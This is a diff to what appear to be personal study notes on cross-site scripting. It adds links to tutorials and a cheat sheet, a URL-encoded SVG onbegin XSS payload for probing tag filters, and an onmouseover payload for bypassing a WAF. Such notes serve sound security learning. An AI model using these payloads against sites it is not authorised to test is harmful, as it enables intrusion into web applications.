@@ -1,7 +1,8 @@
 
 
-## How to search for XSS (with blacklisted HTML tags)
-- [link](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
+## Tags bruteforcing
+- [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
+- [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 #### steps 
 Searching for allowed tags to be inserted in the search field as parameter
@@ -18,3 +19,8 @@ Searching for allowed tags to be inserted in the search field as parameter
 %3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
 ```
 
+## Waf bypass with anchor
+- [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
+```
+onmouseover=alert(document.location.has.substring(1))#payloadhere
+```
